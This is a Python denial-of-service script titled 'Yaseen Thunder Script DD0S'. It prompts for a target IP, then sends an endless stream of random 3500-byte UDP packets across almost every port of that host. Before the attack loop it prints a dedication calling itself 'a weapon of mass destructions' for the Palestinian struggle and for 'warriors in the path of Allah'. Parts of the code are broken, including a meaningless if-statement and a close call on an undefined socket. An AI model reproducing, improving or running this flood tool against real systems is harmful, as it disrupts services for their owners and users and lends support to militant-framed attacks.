# -*- coding: utf-8 -*-
import os
import socket
import random
import time


# Colors
class bcolors:
    HE = '\033[95m'
    OK = '\033[94m'
    CY = '\033[96m'
    GR = '\033[92m'
    WARNING = '\033[93m'
    UNDERLINE = '\033[4m'
    PUR = '\033[97m'
    BO    = "\033[1m"
    BL   = "\033[30m"
    RE     = "\033[31m"
    GR   = "\033[32m"
    YE  = "\033[33m"
    BL    = "\033[34m"
    MAG = "\033[35m"
    CY   = "\033[36m"
    WH   = "\033[37m"
    os.system("clear")

########################
white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(3500)
####################

os.system("clear")
print("""
\033[33m                                                   ╔═ ╗           
\033[33m                                                   ║\033[32m█\033[33m ║  
\033[33m                                                   ║\033[32m█\033[33m ║  
\033[33m                                                   ║\033[32m█\033[33m ║        
\033[33m                   ╔═ ╗     ╔═ ╗      ╔═ ╗     ╔═ ╗║\033[32m█\033[33m ║     
\033[33m                   ║\033[32m█\033[33m ║     ║\033[32m█\033[33m ║      ║\033[32m█\033[33m ║     ║\033[32m█\033[33m ║║\033[32m█\033[33m ║    
\033[33m     ╔═ ╗          ║\033[32m█████████ █████████ █████████\033[33m ║║\033[32m█\033[33m ║
\033[33m     ║\033[32m█\033[33m ║          ║\033[32m████████\033[33m ║\033[32m ███████\033[33m ║\033[32m ███████\033[33m ║ ║\033[32m█\033[33m ║
\033[33m     ║\033[32m█\033[33m ║          ║\033[32m█\033[33m ╔═════╝  ╚══════╝╚╔═ ╗╔═ ╗╝  ║\033[32m█\033[33m ║
\033[33m     ║\033[32m█\033[33m ║          ║\033[32m█\033[33m ║                 ║\033[32m█\033[33m ║║\033[32m█\033[33m ║   ╚═ ╝
\033[33m      ║\033[32m███████████\033[33m ║                    ╚═ ╝╚═ ╝   
\033[33m       ║\033[32m██████████\033[33m ║                 
\033[33m        ╚═════════╝                  
\033[32m╔═══════════════════════════════════════════════════════════╗
\033[32m║\033[33m  Y A S E E N   T H U N D E R   S C R I P T   D D 0 S      \033[32m║
\033[32m╚═══════════════════════════════════════════════════════════╝
""")
ip = input("\033[33m[+] Target's IP : ")
time.sleep(5),
print("\033[32m     Yaseen thunder \033[0m "),
time.sleep(5),
print("\033[33m     a weapon of mass destructions \033[0m "),
time.sleep(5),
print("\033[32m     the most feared by the oppressors \033[0m "),
time.sleep(5),
print("\033[33m     a weapon dedicated to a fighter for the revival of Al-Aqsa \033[0m "),
time.sleep(5),
print("\033[32m     a father for all Palestinians \033[0m "),
time.sleep(5),
print("\033[33m     So.... This script is a small dedication to the struggle \033[0m "),
time.sleep(5),
print("\033[32m     in memory of the great warriors in the path of Allah \033[0m")
time.sleep(5)
print("\033[32m     ...\033[0m")
time.sleep(5)
while True:
    sent = 0
    for port in range(1, 65534):
        white.sendto(bytes, (ip, port))
        sent = sent + 1
        time.sleep(1)
        print("\033[94m[AYAS] \033[97m%s  \033[31m[ATTACK SENT]  \033[92m%s  \033[36mPort \033[33m%s " % (sent, ip, port))
    if():
        s.close
        print("\033[92mSerangan wes Rampung\033[0m")
